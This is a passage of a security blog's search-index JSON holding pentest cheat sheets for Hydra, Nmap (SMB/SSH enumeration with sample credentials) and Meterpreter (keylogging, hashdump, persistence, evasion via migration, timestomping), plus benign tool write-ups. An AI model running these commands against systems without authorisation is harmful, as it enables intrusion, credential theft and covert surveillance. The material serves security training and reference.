Flags\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-h\u003c/code\u003e\u003c/strong\u003e: Display the help menu.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-l \u0026lt;username\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify a single username/login.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-L \u0026lt;wordlist\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Use a wordlist for usernames/logins.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p \u0026lt;password\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify a single password.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-P \u0026lt;wordlist\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Use a wordlist for passwords.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-s \u0026lt;PORT\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify the target port.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-f\u003c/code\u003e\u003c/strong\u003e: Stop brute-forcing after finding valid credentials.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-R\u003c/code\u003e\u003c/strong\u003e: Restore a previous session.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-t \u0026lt;number\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Set the number of threads to use.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-V\u003c/code\u003e\u003c/strong\u003e: Enable verbose mode.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"supported-protocols\"\u003eSupported Protocols\u003c/h2\u003e\n\u003cp\u003eHydra supports numerous protocols, including:\u003c/p\u003e","title":"Hydra"},{"content":"Nmap (Network Mapper) is the go-to tool for network discovery and security auditing. It’s powerful, flexible, and essential for professionals in cybersecurity.\nBasic Syntax nmap \u0026lt;target IP\u0026gt; nmap -sT -sS -Pn -v 10.10.10.10 sudo nmap -A -sS -Pn 10.10.10.10 sudo nmap -sV -sT -O -p- -vv --script vulners 10.10.10.10 Common Flags Scan Types -sT: Perform a TCP connect scan. -sU: Perform a UDP scan. -sS: Perform a SYN scan (\u0026ldquo;Stealth Scan\u0026rdquo;). -Pn: Skip pinging the target. -sn: Host discovery without scanning ports. -A: Enable aggressive scan options. Advanced Features -p \u0026lt;PORT\u0026gt;: Scan specific ports. -p-: Scan all 65,535 ports. -sV: Detect services and versions running on the target. -O: Detect the operating system. -v****, -vv, ********-vvv: Set verbosity levels. --script vuln: Run vulnerability scripts. --script vulners: Use vulners scripts for CVE-based scanning. --script=http-enum: Act like Nikto to enumerate HTTP resources. Output Formats -oN: Normal text output, best for human-readable logs during manual reviews. -oX: XML output, ideal for automated tools or integrations that require structured data. ``: Greppable output, useful for scripting and quickly filtering resulst with tools like grep. -oA: Generate all three formats at once, providing maximum flexibility for further analysis or reporting. SMB Scripts Enumerate Security Mode nmap -p445 --script smb-security-mode 192.168.1.1 Enumerate Sessions nmap -p445 --script smb-enum-sessions 192.168.1.1 nmap -p445 --script smb-enum-sessions --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Shares nmap -p445 --script smb-enum-shares 192.168.1.1 nmap -p445 --script smb-enum-shares --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Shares with Listing Listing shares and their contents can reveal valuable information about a system, such as misconfigured permissions or sensitive files stored in shared directories. This is especially important during audits or penetration tests to identify potential security gaps.\nnmap -p445 --script smb-enum-shares,smb-ls --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Users nmap -p445 --script smb-enum-users --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Stats nmap -p445 --script smb-enum-stats --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Domains nmap -p445 --script smb-enum-domains --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Groups nmap -p445 --script smb-enum-groups --script-args smbusername=administrator,smbpassword=password 192.168.1.1 SSH Scripts Enumerate Algorithms nmap 192.168.1.1 -p 22 --script ssh2-enum-algos Enumerate Host Keys nmap 192.168.1.1 -p 22 --script ssh-hostkey --script-args ssh_hostkey=full Enumerate Authentication Methods nmap 192.168.1.1 -p 22 --script ssh-auth-methods --script-args=\u0026#34;ssh.user=admin\u0026#34; Final Thoughts Nmap is a versatile and robust tool that adapts to a wide range of use cases, from simple port scans to detailed vulnerability assessments. Keep this cheat sheet handy for quick reference, and remember: the more you practice, the more efficient your scanning workflows will become!\n","permalink":"http://localhost:1313/cheat-sheets/nmap/","summary":"\u003cp\u003e\u003cstrong\u003eNmap\u003c/strong\u003e (Network Mapper) is the go-to tool for network discovery and security auditing. It’s powerful, flexible, and essential for professionals in cybersecurity.\u003c/p\u003e\n\u003ch2 id=\"basic-syntax\"\u003eBasic Syntax\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap \u0026lt;target IP\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -sT -sS -Pn -v 10.10.10.10\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo nmap -A -sS -Pn 10.10.10.10\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo nmap -sV -sT -O -p- -vv --script vulners 10.10.10.10\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"common-flags\"\u003eCommon Flags\u003c/h2\u003e\n\u003ch3 id=\"scan-types\"\u003eScan Types\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sT\u003c/code\u003e\u003c/strong\u003e: Perform a TCP connect scan.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sU\u003c/code\u003e\u003c/strong\u003e: Perform a UDP scan.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sS\u003c/code\u003e\u003c/strong\u003e: Perform a SYN scan (\u0026ldquo;Stealth Scan\u0026rdquo;).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-Pn\u003c/code\u003e\u003c/strong\u003e: Skip pinging the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sn\u003c/code\u003e\u003c/strong\u003e: Host discovery without scanning ports.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-A\u003c/code\u003e\u003c/strong\u003e: Enable aggressive scan options.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"advanced-features\"\u003eAdvanced Features\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p \u0026lt;PORT\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Scan specific ports.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p-\u003c/code\u003e\u003c/strong\u003e: Scan all 65,535 ports.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sV\u003c/code\u003e\u003c/strong\u003e: Detect services and versions running on the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-O\u003c/code\u003e\u003c/strong\u003e: Detect the operating system.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-v\u003c/code\u003e\u003c/strong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e****, \u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003ccode\u003e-vv\u003c/code\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e, ****\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e****\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003cstrong\u003e\u003ccode\u003e-vvv\u003c/code\u003e\u003c/strong\u003e: Set verbosity levels.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--script vuln\u003c/code\u003e\u003c/strong\u003e: Run vulnerability scripts.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--script vulners\u003c/code\u003e\u003c/strong\u003e: Use vulners scripts for CVE-based scanning.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--script=http-enum\u003c/code\u003e\u003c/strong\u003e: Act like Nikto to enumerate HTTP resources.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"output-formats\"\u003eOutput Formats\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-oN\u003c/code\u003e\u003c/strong\u003e: Normal text output, best for human-readable logs during manual reviews.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-oX\u003c/code\u003e\u003c/strong\u003e: XML output, ideal for automated tools or integrations that require structured data.\u003c/li\u003e\n\u003cli\u003e``: Greppable output, useful for scripting and quickly filtering resulst with tools like \u003ccode\u003egrep\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-oA\u003c/code\u003e\u003c/strong\u003e: Generate all three formats at once, providing maximum flexibility for further analysis or reporting.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"smb-scripts\"\u003eSMB Scripts\u003c/h2\u003e\n\u003ch3 id=\"enumerate-security-mode\"\u003eEnumerate Security Mode\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-security-mode 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-sessions\"\u003eEnumerate Sessions\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-enum-sessions 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-enum-sessions --script-args smbusername\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eadministrator,smbpassword\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003epassword 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-shares\"\u003eEnumerate Shares\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-enum-shares 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-enum-shares --script-args smbusername\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eadministrator,smbpassword\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003epassword 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-shares-with-listing\"\u003eEnumerate Shares with Listing\u003c/h3\u003e\n\u003cp\u003eListing shares and their contents can reveal valuable information about a system, such as misconfigured permissions or sensitive files stored in shared directories. This is especially important during audits or penetration tests to identify potential security gaps.\u003c/p\u003e","title":"nmap"},{"content":"Daily domain reports are a treasure trove for cybersecurity analysts, but collecting and organizing them can quickly become tedious. That’s where RedFlagger comes in. This lightweight Bash script automates the process of downloading and aggregating reports from Red Flag Domains. It’s simple, efficient, and built to save time—whether you’re sifting through a few recent reports or analyzing a year’s worth of data.\nThe Backstory This project started as a bit of a joke. My friend lil-doudou had written an excellent Python tool called NewRedflag to handle domain report aggregation, but he’s also a massive Bash enthusiast. So, as a playful nod to his love for scripting, I decided to rewrite the functionality in Bash—simpler, lighter, and arguably more fun (depending on your feelings about shell scripts).\nWhat Does RedFlagger Do? RedFlagger streamlines the process of collecting domain reports. Instead of manually navigating the Red Flag Domains website and downloading reports one by one, you can use RedFlagger to:\nFetch the latest report. Download reports from a specific range of dates. Aggregate all available reports into one file for easier analysis. It’s a no-frills script that prioritizes functionality and flexibility.\nHow Does It Work? RedFlagger fetches reports directly from the Red Flag Domains website by parsing the daily directory. It uses simple Bash commands like curl to download files and aggregates them into a single output file for easy handling. If you’re running a quick analysis or building a dataset for long-term research, this script has you covered.\nKey Features: Custom Date Ranges: Specify a range of days to download only the reports you need. All-Inclusive Downloads: Grab every report available with a single command. Custom Output Files: Aggregate data into a file of your choice instead of dealing with multiple separate files. Why Use RedFlagger? RedFlagger is built for simplicity and speed. It doesn’t aim to replace more advanced tools but instead provides a lightweight option for users who need quick, automated access to domain reports. If you find yourself regularly pulling data from Red Flag Domains, RedFlagger can:\nSave time by automating the download process. Ensure reports are organized and aggregated for easier analysis. Provide flexible options for handling specific dates or all available data. Whether you’re an analyst tracking malicious domains or a researcher building a threat intelligence dataset, RedFlagger can fit seamlessly into your workflow.\nGetting Started Installation RedFlagger is a standalone Bash script, so there’s no complicated setup. Here’s how to get started:\nDownload the script:\ngit clone https://github.com/noobosaurus-r3x/redflagger cd redflagger chmod +x redflagger.sh Make sure curl is installed on your system:\nsudo apt install curl Usage The script provides several options to customize your downloads. Here’s the basic syntax:\n./redflagger.sh [--latest|--days num] [--all] [--output filename] Options --latest or -l: Downloads the report from 1 day ago. --days num or -d num: Downloads the report from num days ago. --all or -a: Downloads all available reports. --output filename or -o filename: Specifies the output file to store the downloaded reports. Defaults to output.txt if no filename is provided. Examples Here are a few practical ways to use RedFlagger:\nDownload the latest report:\n./redflagger.sh -l Download all reports available since 3 days ago:\n./redflagger.sh -d 3 -a -o my_file.txt Download a specific day’s report:\n./redflagger.sh -d 5 -o report_5days_ago.txt Download all reports into a custom file:\n./redflagger.sh -a -o all_reports.txt Limitations and Room for Improvement RedFlagger is intentionally simple, but it’s not without its limitations. Here are a few areas where it could be expanded or improved:\nError Handling: While the script includes basic error checks, it could provide more detailed feedback when something goes wrong (e.g., network issues or missing reports). Parallel Downloads: Adding support for downloading multiple reports simultaneously could speed up large fetches. Advanced Filtering: Options for filtering by domain type or metadata could make the tool even more powerful. If you’re interested in extending RedFlagger, feel free to fork it and make it your own.\nFinal Thoughts RedFlagger is a small, straightforward tool designed to make life easier for anyone working with Red Flag Domains. It doesn’t try to do everything but focuses on doing one thing well: fetching and aggregating domain reports quickly and efficiently.\nWhether you’re doing threat research, building datasets, or just exploring the domain data available, RedFlagger is a lightweight addition to your toolbox. And let’s not forget—it’s also a fun jab at my friend’s Python-first approach. If you’ve got ideas for improvements or run into any issues, don’t hesitate to reach out or fork the project. Happy aggregating!\n","permalink":"http://localhost:1313/tools/redflagger/","summary":"\u003cp\u003eDaily domain reports are a treasure trove for cybersecurity analysts, but collecting and organizing them can quickly become tedious. That’s where \u003cstrong\u003eRedFlagger\u003c/strong\u003e comes in. This lightweight Bash script automates the process of downloading and aggregating reports from \u003ca href=\"https://dl.red.flag.domains/daily/\"\u003eRed Flag Domains\u003c/a\u003e. It’s simple, efficient, and built to save time—whether you’re sifting through a few recent reports or analyzing a year’s worth of data.\u003c/p\u003e\n\u003ch2 id=\"the-backstory\"\u003eThe Backstory\u003c/h2\u003e\n\u003cp\u003eThis project started as a bit of a joke. My friend \u003cstrong\u003elil-doudou\u003c/strong\u003e had written an excellent Python tool called \u003ca href=\"https://github.com/lil-doudou/NewRedflag\"\u003eNewRedflag\u003c/a\u003e to handle domain report aggregation, but he’s also a massive Bash enthusiast. So, as a playful nod to his love for scripting, I decided to rewrite the functionality in Bash—simpler, lighter, and arguably more fun (depending on your feelings about shell scripts).\u003c/p\u003e","title":"redflagger"},{"content":"When you need to quickly understand the structure of a webpage, a lightweight tool can save the day. Webpage Infos Extractor is just that: a simple JavaScript bookmarklet that extracts useful information like forms, links, images, and word count from any webpage. No extensions or extra software required—just a single bookmark to get key insights instantly.\nWhy Build This? Sometimes, the simplest tools are the most convenient. I needed a way to peek under the hood of webpages during quick tests or casual research without opening dev tools every time. So, I threw together this bookmarklet to make data analysis fast and portable. It’s not groundbreaking, but it gets the job done without any fuss.\nWhat Does It Do? Once activated, the bookmarklet scans the current webpage and extracts:\nForms: Shows details like form actions, methods, and input elements.\nLinks: Lists all hyperlinks found on the page.\nImages: Displays all images in an easy-to-view layout.\nWord Count: Calculates the total number of words in the page’s text content.\nThe results are neatly presented in a new browser window with clean formatting, so you can analyze everything at a glance.\nInstallation Setting it up is simple. Here’s how:\nOpen your web browser and create a new bookmark.\nEdit the bookmark’s URL field and paste the following JavaScript code:\njavascript:(function(){var forms=document.getElementsByTagName(\u0026#39;form\u0026#39;);var links=document.getElementsByTagName(\u0026#39;a\u0026#39;);var images=document.getElementsByTagName(\u0026#39;img\u0026#39;);var bodyText=document.body.innerText;var wordCount=bodyText.split(/\\s+/).filter(function(word){return word.length\u0026gt;0;}).length;var newWindow=window.open(\u0026#39;\u0026#39;,\u0026#39;\u0026#39;,\u0026#39;width=800,height=600\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;html\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;Extracted Data\u0026lt;/title\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;style\u0026gt;body{font-family:Arial,sans-serif}table{width:100%;border-collapse:collapse;margin-bottom:20px}th,td{border:1px solid #ddd;padding:8px;text-align:left}th{background-color:#f2f2f2}tr:nth-child(even){background-color:#f9f9f9}h2{background-color:#4CAF50;color:white;padding:10px}\u0026lt;/style\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;h2\u0026gt;Forms:\u0026lt;/h2\u0026gt;\u0026#39;);for(var i=0;i\u0026lt;forms.length;i++){var form=forms[i];newWindow.document.write(\u0026#39;\u0026lt;table\u0026gt;\u0026lt;tr\u0026gt;\u0026lt;th colspan=\u0026#34;3\u0026#34;\u0026gt;Form \u0026#39;+(i+1)+\u0026#39;\u0026lt;/th\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;Action\u0026lt;/td\u0026gt;\u0026lt;td colspan=\u0026#34;2\u0026#34;\u0026gt;\u0026#39;+(form.action||\u0026#39;N/A\u0026#39;)+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;Method\u0026lt;/td\u0026gt;\u0026lt;td colspan=\u0026#34;2\u0026#34;\u0026gt;\u0026#39;+(form.method||\u0026#39;get\u0026#39;)+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;th\u0026gt;Name\u0026lt;/th\u0026gt;\u0026lt;th\u0026gt;Type\u0026lt;/th\u0026gt;\u0026lt;th\u0026gt;Value\u0026lt;/th\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);for(var j=0;j\u0026lt;form.elements.length;j++){var element=form.elements[j];var value=element.value||\u0026#39;N/A\u0026#39;;if(element.type===\u0026#39;checkbox\u0026#39;||element.type===\u0026#39;radio\u0026#39;){value=element.checked?\u0026#39;on\u0026#39;:\u0026#39;off\u0026#39;}newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;\u0026#39;+(element.name||\u0026#39;N/A\u0026#39;)+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;\u0026#39;+(element.type||\u0026#39;N/A\u0026#39;)+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;\u0026#39;+value+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;)}newWindow.document.write(\u0026#39;\u0026lt;/table\u0026gt;\u0026#39;)}newWindow.document.write(\u0026#39;\u0026lt;h2\u0026gt;Links:\u0026lt;/h2\u0026gt;\u0026lt;table\u0026gt;\u0026lt;tr\u0026gt;\u0026lt;th\u0026gt;Link\u0026lt;/th\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);for(var i=0;i\u0026lt;links.length;i++){newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;\u0026lt;a href=\u0026#34;\u0026#39;+links[i].href+\u0026#39;\u0026#34; target=\u0026#34;_blank\u0026#34;\u0026gt;\u0026#39;+links[i].href+\u0026#39;\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;)}newWindow.document.write(\u0026#39;\u0026lt;/table\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;h2\u0026gt;Images:\u0026lt;/h2\u0026gt;\u0026#39;);for(var i=0;i\u0026lt;images.length;i++){newWindow.document.write(\u0026#39;\u0026lt;img src=\u0026#34;\u0026#39;+images[i].src+\u0026#39;\u0026#34; style=\u0026#34;max-width:100%;display:block;margin-bottom:10px;\u0026#34;\u0026gt;\u0026#39;)}newWindow.document.write(\u0026#39;\u0026lt;h2\u0026gt;Word Count:\u0026lt;/h2\u0026gt;\u0026lt;p\u0026gt;\u0026#39;+wordCount+\u0026#39; words\u0026lt;/p\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;\u0026#39;);newWindow.document.close();})(); Save the bookmark.\nThat’s it! You now have a bookmarklet ready to extract webpage info.\nHow to Use Navigate to the webpage you want to analyze.\nClick on the saved bookmarklet.\nA new window will pop up with the following details:\nForms: Lists actions, methods, and input fields.\nLinks: Displays all hyperlinks found on the page.\nImages: Previews all images on the page.\nWord Count: Shows the total word count of the page’s text content.\nWhy Use It? This tool is perfect for:\nWeb Developers: Debugging forms, analyzing links, or reviewing images for optimization.\nContent Creators: Counting words or inspecting embedded media.\nResearchers: Extracting links or analyzing page structures quickly.\nIt’s not trying to replace full-fledged tools like browser dev tools, but it’s great for quick insights without digging into a complex interface.\nLimitations This bookmarklet is lightweight and portable, but it’s not flawless. Here are a few things to keep in mind:\nBrowser Compatibility: It works on most modern browsers but may struggle with certain page structures or dynamic content.\nStatic Analysis: It doesn’t execute JavaScript-heavy elements, so it’s best suited for simpler pages.\nBasic Formatting: The output is clean but not customizable.\nFinal Thoughts The Webpage Infos Extractor isn’t revolutionary, but it’s incredibly handy. Whether you’re troubleshooting a webpage or casually analyzing content, this bookmarklet gives you the essentials at a click. Simple, portable, and effective—sometimes, that’s all you need. If you think of ways to enhance it, feel free to tweak the code and make it your own!\n","permalink":"http://localhost:1313/tools/webpage_infos_extractor/","summary":"\u003cp\u003eWhen you need to quickly understand the structure of a webpage, a lightweight tool can save the day. \u003cstrong\u003eWebpage Infos Extractor\u003c/strong\u003e is just that: a simple JavaScript bookmarklet that extracts useful information like forms, links, images, and word count from any webpage. No extensions or extra software required—just a single bookmark to get key insights instantly.\u003c/p\u003e\n\u003ch2 id=\"why-build-this\"\u003eWhy Build This?\u003c/h2\u003e\n\u003cp\u003eSometimes, the simplest tools are the most convenient. I needed a way to peek under the hood of webpages during quick tests or casual research without opening dev tools every time. So, I threw together this bookmarklet to make data analysis fast and portable. It’s not groundbreaking, but it gets the job done without any fuss.\u003c/p\u003e","title":"Webpage Infos Extractor"},{"content":"Meterpreter, the post-exploitation payload for Metasploit, is your Swiss Army knife for interacting with compromised systems. It provides a suite of commands to navigate, persist, and extract information from your target.\nBasic Commands Start with the essentials to get a lay of the land:\nhelp: Display a list of available commands (your lifeline when you\u0026rsquo;re lost). sysinfo: Get basic system information, including OS and hostname (think of it as a \u0026ldquo;who am I dealing with?\u0026rdquo;). ps: List running processes. kill \u0026lt;PID\u0026gt;: Terminate a process by its PID (because some processes just need to \u0026ldquo;go away\u0026rdquo;). migrate \u0026lt;PID\u0026gt;: Move Meterpreter to a different process to stay under the radar. rev2self: Revert privileges to the original user (a \u0026ldquo;reset button\u0026rdquo; for when things get weird). File System Commands For poking around the file system:\nls: List files in the current directory. cd \u0026lt;path\u0026gt;: Change to a new directory. pwd: Print the current working directory. cat \u0026lt;filename\u0026gt;: Display the contents of a file. download \u0026lt;filename\u0026gt;: Pull a file from the target to your local machine. upload \u0026lt;filename\u0026gt;: Push a file to the target system. Network Commands To scope out the network situation:\nipconfig: Display network configuration (IP addresses, gateways, etc.). route: Show the routing table. netstat: View active network connections. portfwd [add/remove]: Set up port forwarding (e.g., local port -\u0026gt; remote service). getsockname: Identify the socket name for a connection. User Management Commands Understand who you are and who else is around:\ngetuid: Display the current user ID. ps: See running processes and their owners. getprivs: List the privileges available to the current user. getsystem: Attempt to escalate privileges to SYSTEM (good luck!). Persistence Commands Stick around longer than you’re welcome:\npersistence: Enable Meterpreter persistence on the target (requires autorun setup). run \u0026lt;script\u0026gt;: Execute scripts or commands at startup. Shell Commands Take a deeper dive with shell access:\nshell: Open a command prompt on the target (sometimes, old-school is best). execute -f \u0026lt;command\u0026gt;: Run a command on the target. background: Push your current session into the background to multitask. Ctrl+Z: Suspend the current session (don’t forget to resume it later). Other Commands For the extra \u0026ldquo;James Bond\u0026rdquo; touch:\nuse \u0026lt;extension\u0026gt;: Load a Meterpreter extension (e.g., incognito, sniffer). keyscan_start: Begin logging keystrokes (capture your target’s every typo). keyscan_dump: Dump the logged keystrokes. screenshot: Capture a screenshot of the target’s desktop. webcam_list: See available webcams on the target. webcam_snap: Take a snapshot from a webcam. hashdump: Dump password hashes (everyone’s favorite). timestomp \u0026lt;file\u0026gt;: Modify the timestamps of a file (because subtlety matters). Tips and Tricks Migrate Smartly: When migrating, pick a process that’s stable (e.g., explorer.exe) and won’t raise suspicions. Background Often: Always background your session before launching new exploits—multitasking is key. Scripting is King: Use Meterpreter scripts (run \u0026lt;script\u0026gt;) to automate repetitive tasks. Final Thoughts Meterpreter is your trusty post-exploitation buddy. Use it wisely, creatively, and responsibly. Keep this cheat sheet handy for quick reference—whether you\u0026rsquo;re downloading files, snapping screenshots, or simply making your mark in the digital shadows. Happy hacking!\n","permalink":"http://localhost:1313/cheat-sheets/meterpreter/","summary":"\u003cp\u003e\u003cstrong\u003eMeterpreter\u003c/strong\u003e, the post-exploitation payload for Metasploit, is your Swiss Army knife for interacting with compromised systems. It provides a suite of commands to navigate, persist, and extract information from your target.\u003c/p\u003e\n\u003ch2 id=\"basic-commands\"\u003eBasic Commands\u003c/h2\u003e\n\u003cp\u003eStart with the essentials to get a lay of the land:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003ehelp\u003c/code\u003e\u003c/strong\u003e: Display a list of available commands (your lifeline when you\u0026rsquo;re lost).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003esysinfo\u003c/code\u003e\u003c/strong\u003e: Get basic system information, including OS and hostname (think of it as a \u0026ldquo;who am I dealing with?\u0026rdquo;).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003eps\u003c/code\u003e\u003c/strong\u003e: List running processes.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003ekill \u0026lt;PID\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Terminate a process by its PID (because some processes just need to \u0026ldquo;go away\u0026rdquo;).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003emigrate \u0026lt;PID\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Move Meterpreter to a different process to stay under the 